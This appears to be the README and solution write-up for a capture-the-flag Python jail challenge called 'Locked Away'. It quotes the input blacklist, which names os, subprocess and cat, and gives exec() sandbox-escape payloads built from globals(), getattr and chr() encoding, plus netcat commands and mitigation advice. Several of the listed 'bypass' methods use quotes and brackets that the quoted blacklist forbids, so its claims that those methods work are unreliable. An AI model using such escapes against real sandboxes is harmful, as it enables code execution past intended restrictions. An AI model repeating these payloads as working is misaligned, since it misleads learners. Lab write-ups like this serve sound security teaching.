# Locked Away - CTF Challenge

## 📋 Challenge Information

**Category:** Misc / Jail  
**Difficulty:** Easy-Medium  
**Target:** Port 1337  
**Challenge Type:** Python Sandbox Escape  

## 📝 Challenge Description

Locked Away is a Python jail challenge where you're given access to a restricted Python `exec()` environment. The goal is to bypass the blacklist filters and execute the `open_chest()` function to retrieve the flag.

## 🎯 Solution Overview

This challenge involves bypassing a Python blacklist filter to execute restricted functions:

### The Challenge

- An `open_chest()` function exists that reads and prints the flag
- User input is passed to `exec()` for execution
- A blacklist prevents common attack patterns
- Goal: Call `open_chest()` without using blacklisted keywords

### Blacklisted Keywords

```python
blacklist = [
    'import', 'os', 'sys', 'breakpoint',
    'flag', 'txt', 'read', 'eval', 'exec',
    'dir', 'print', 'subprocess', '[', ']',
    'echo', 'cat', '>', '<', '"', '\'', 'open'
]
```

### Bypass Techniques

**Method 1: Direct Function Call**
```python
open_chest()
```
This works because `open_chest` is already defined in the global scope!

**Method 2: Using `globals()` (if brackets blocked)**
```python
globals().get('open_chest')()
```

**Method 3: String Obfuscation**
```python
getattr(globals().get('open_chest'), '__call__')()
```

**Method 4: Unicode/Encoding Tricks**
If the function name is blocked, use character composition:
```python
func_name = 'open' + '_chest'
globals()[func_name]()
```

## 🚀 Quick Start

### Prerequisites

- Python 3.6+
- Network access to target (or Docker for local testing)
- `netcat` or `pwntools`

### Running the Solution

```bash
# Navigate to the challenge directory
cd Misc/locked_away

# Method 1: Using netcat
echo "open_chest()" | nc target 1337

# Method 2: Using the Python exploit script
python3 solution/solve.py <target_host> <target_port>

# Example:
python3 solution/solve.py localhost 1337
```

### Building Locally

```bash
# Build and run Docker container
./build_docker.sh

# Or manually:
docker build -t misc_locked_away .
docker run --rm -it -p 1337:1337 misc_locked_away
```

### Testing Locally

```bash
# Connect to local instance
nc localhost 1337

# Or use telnet
telnet localhost 1337

# Try the exploit
The chest lies waiting... open_chest()
```

## 📁 Folder Structure

```
locked_away/
├── README.md              # This file
├── build_docker.sh       # Docker build script
├── Dockerfile            # Container configuration
├── challenge/            # Application source
│   └── main.py          # Python jail challenge
├── data/                # Challenge data
│   └── flag.txt        # Test flag
├── docs/               # Additional documentation
└── solution/           # Solution scripts
    ├── solve.py       # Python exploit script
    └── solve_manual.txt  # Manual commands
```

## 🔧 Technical Details

### Vulnerability Analysis

**File:** `challenge/main.py`  
**Vulnerable Code:** `exec(command)`  
**Issue Type:** Python Sandbox Escape

#### Why This Works

1. **`open_chest()` is in Global Scope**
   - The function is defined before the input loop
   - It's accessible via `globals()`
   - We can call it directly!

2. **Blacklist is Insufficient**
   - Doesn't block `open_chest` specifically
   - Doesn't block `globals()` or `getattr()`
   - Doesn't prevent function calls with parentheses

3. **`exec()` Has Full Access**
   - Inherits all globals from the main scope
   - No sandboxing or restricted execution
   - Can call any function that exists

### Exploitation Methods

**Simple Direct Call (Best):**
```python
open_chest()
```

**Using globals() Dictionary:**
```python
globals().get(chr(111)+chr(112)+chr(101)+chr(110)+chr(95)+chr(99)+chr(104)+chr(101)+chr(115)+chr(116))()
```

**Using getattr:**
```python
getattr(__builtins__, chr(101)+chr(120)+chr(101)+chr(99))('open_chest()')
```

**String Concatenation:**
```python
func = 'open' + '_' + 'chest'
globals()[func]()
```

## 🐛 Troubleshooting

### Connection Issues
```bash
# Test if service is running
nc -zv target 1337

# Check Docker container
docker ps | grep locked_away
docker logs misc_locked_away
```

### Payload Blocked
If your payload is blocked:
- Ensure no blacklisted keywords are used
- Try encoding strings with `chr()` or hex
- Use getattr() instead of direct attribute access
- Use globals() to access functions

### Invalid Command Error
```
Invalid command!
```
This means your input contains a blacklisted keyword. Try:
- Alternative function names
- String obfuscation
- Character encoding

## 💡 Learning Points

1. **Python Sandbox Escapes:** Understanding Python's global scope and introspection
2. **Blacklist Bypasses:** Why blacklists are insufficient for security
3. **Code Execution:** Dangers of `exec()` with user input
4. **String Obfuscation:** Techniques to bypass pattern matching
5. **Defensive Programming:** Need for proper sandboxing (not just blacklists)

## 🛡️ Mitigation

To properly secure this:

```python
# 1. Use a whitelist instead of blacklist
allowed_commands = {'help', 'quit', 'info'}

# 2. Don't use exec() at all
# 3. Use restricted execution environments (containers, VMs)
# 4. Don't expose dangerous functions in global scope
# 5. Implement proper input validation and sanitization

# Better approach:
import ast
def safe_eval(code):
    # Parse and validate AST before execution
    tree = ast.parse(code, mode='eval')
    # Check for dangerous operations
    # Only allow safe operations
```

## 📖 Additional Resources

- [Python Sandbox Escape Techniques](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes)
- [Python `exec()` Security](https://docs.python.org/3/library/functions.html#exec)
- [Code Injection Prevention](https://owasp.org/www-community/attacks/Code_Injection)

## ✅ Success Criteria

- Connect to the challenge service
- Bypass the blacklist filter
- Execute the `open_chest()` function
- Retrieve the flag
- Flag format: `HTB{...}`

## 🏆 Expected Output

```
.____                  __              .___    _____                        
|    |    ____   ____ |  | __ ____   __| _/   /  _  \__  _  _______  ___.__.
|    |   /  _ \_/ ___\|  |/ // __ \ / __ |   /  /_\  \ \/ \/ /\__  \<   |  |
|    |__(  <_> )  \___|    <\  ___// /_/ |  /    |    \     /  / __ \\___  |
|_______ \____/ \___  >__|_ \\___  >____ |  \____|__  /\/\_/  (____  / ____|
        \/          \/     \/    \/     \/          \/             \/\/     

The chest lies waiting... open_chest()
HTB{...}
```

---

**Challenge Type:** Python Jail / Sandbox Escape  
**Key Vulnerability:** Insufficient blacklist filtering with exposed functions  
**Difficulty:** Easy-Medium (simple bypass with direct call)  
**Solution Time:** < 5 minutes with right approach
